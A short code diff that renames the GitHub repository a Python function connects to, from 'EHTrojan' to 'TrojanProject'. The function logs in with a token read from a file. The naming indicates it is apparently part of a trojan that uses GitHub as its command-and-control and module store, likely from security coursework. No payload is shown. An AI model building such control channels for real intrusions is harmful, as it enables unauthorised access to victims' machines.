@@ -16,7 +16,7 @@ def github_connect():
         token = f.read()
     user = 'SerhadAras'
     sess = github3.login(token=token)
-    return sess.repository(user, 'EHTrojan')
+    return sess.repository(user, 'TrojanProject')
 
 
 def get_file_contents(dirname, module_name, repo):
